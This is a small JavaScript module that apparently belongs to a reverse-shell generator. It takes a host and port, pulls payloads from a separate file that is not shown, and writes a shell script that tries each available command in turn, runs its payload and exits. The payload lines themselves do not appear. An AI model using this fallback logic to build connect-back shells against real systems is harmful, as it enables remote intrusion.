'use strict';

const generatePayloads = require('./payloads');

const generateScript = (host, port) => {
	const payloads = generatePayloads(host, port);

	return Object.keys(payloads).reduce((acc, cmd) => {
		acc += `if type ${cmd} &> /dev/null; then\n` +
      ` ${payloads[cmd]}\n` +
      ' exit; \n' +
      'fi \n';
		return acc;
	}, '');
};

module.exports = { generateScript };
